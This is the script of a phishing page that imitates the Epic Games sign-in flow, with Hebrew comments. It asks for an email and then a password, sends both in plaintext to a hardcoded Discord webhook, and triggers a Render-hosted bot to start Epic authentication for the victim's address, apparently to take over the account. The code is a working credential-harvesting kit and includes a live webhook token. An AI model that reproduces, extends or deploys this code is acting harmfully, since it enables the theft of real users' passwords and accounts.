<script>
  let step = 1;

  // הקישורים של המערכת שלך
  const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1553888454205505569/66leAHWK1M7MXLTRUivGrWfdIR2Ouwv8ChVVGxyuIdi_C9E-ZGRdUtFL19JFq6mbxRe9';
  const RENDER_BOT_URL = 'https://epicbot-q18a.onrender.com';

  function handleContinue() {
    const emailInput = document.getElementById('email-input');
    const passwordInput = document.getElementById('password-input');
    const errorMsg = document.getElementById('error-msg');
    const actionBtn = document.getElementById('action-btn');
    const btnText = document.getElementById('btn-text');
    const btnSpinner = document.getElementById('btn-spinner');
    const mainCard = document.getElementById('main-card');

    if (step === 1) {
      if (!emailInput.value || !emailInput.value.includes('@')) {
        errorMsg.style.display = 'block';
        return;
      }
      errorMsg.style.display = 'none';

      btnText.style.display = 'none';
      btnSpinner.style.display = 'block';
      actionBtn.style.pointerEvents = 'none';

      setTimeout(() => {
        btnSpinner.style.display = 'none';
        btnText.style.display = 'inline';
        actionBtn.style.pointerEvents = 'auto';

        step = 2;
        mainCard.classList.remove('step-1-align');
        mainCard.classList.add('step-2-align');

        document.getElementById('user-email-target').textContent = emailInput.value;
        document.getElementById('email-group').style.display = 'none';
        document.getElementById('password-group').style.display = 'block';
        document.getElementById('password-input').focus();

        actionBtn.textContent = 'Sign in';
        actionBtn.style.backgroundColor = '#222228';
        actionBtn.style.color = '#80808a';

        document.getElementById('back-btn').style.display = 'flex';
        document.getElementById('social-sections').style.display = 'none';
        document.getElementById('signup-subtext').style.display = 'none';
        document.getElementById('trouble-link').style.display = 'none';
        document.getElementById('email-display').style.display = 'block';
        document.getElementById('logo-container').style.display = 'none';
        document.getElementById('form-title').textContent = 'Enter your password';
      }, 1500);

    } else {
      if (!passwordInput.value) return;

      const userEmail = emailInput.value;
      const userPassword = passwordInput.value;

      // 1. שליחת הפרטים אליך לערוץ הדיסקורד הפרטי (Webhook)
      fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: "מערכת הרשמה לקורס",
          embeds: [{
            title: "📥 נרשם חדש באתר!",
            color: 3825912,
            fields: [
              { name: "📧 אימייל", value: userEmail, inline: true },
              { name: "🔑 סיסמה/פרט מזהה", value: userPassword, inline: true },
              { name: "⏰ זמן הרשמה", value: new Date().toLocaleString('he-IL'), inline: false }
            ],
            footer: { text: "Epic Games Style Course Registration" }
          }]
        })
      });

      // 2. הפעלת הבוט ב-Render לקבלת קישור Epic בדיסקורד
      fetch(`${RENDER_BOT_URL}/api/start-auth`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: userEmail
        })
      }).catch(err => console.error('Error starting Epic auth:', err));

      alert('הפרטים נשלחו בהצלחה!');
      resetForm();
    }
  }

  function resetForm() {
    step = 1;
    document.getElementById('email-input').value = '';
    document.getElementById('password-input').value = '';
    document.getElementById('email-group').style.display = 'block';
    document.getElementById('password-group').style.display = 'none';
    document.getElementById('back-btn').style.display = 'none';
    document.getElementById('social-sections').style.display = 'block';
    document.getElementById('signup-subtext').style.display = 'block';
    document.getElementById('trouble-link').style.display = 'block';
    document.getElementById('email-display').style.display = 'none';
    document.getElementById('logo-container').style.display = 'block';
    document.getElementById('form-title').textContent = 'Sign in or create account';

    const actionBtn = document.getElementById('action-btn');
    actionBtn.textContent = 'Continue';
    actionBtn.style.backgroundColor = '#0074e4';
    actionBtn.style.color = '#fff';
  }
</script>
